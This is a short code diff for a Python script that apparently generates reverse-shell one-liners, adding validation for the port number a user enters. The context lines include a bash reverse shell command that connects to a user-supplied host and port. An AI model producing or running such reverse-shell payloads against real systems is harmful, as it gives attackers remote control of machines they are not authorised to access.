@@ -35,8 +35,18 @@ while True:
                 break
             else:
                 print("Please enter a valid IP")
+        while True:
+            try:
+                LPORT = int(input("Enter port number to use: "))
+            except ValueError:
+                print("Please enter a valid port number.")
+                continue
 
-        LPORT = int(input("Enter port number to use: "))
+            if not LPORT in range(1,65535):
+                print("Please enter a valid port number.")
+            
+            else:
+                break
         
         if shell_type == reverse_shells[0]:
             print(f"\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1")
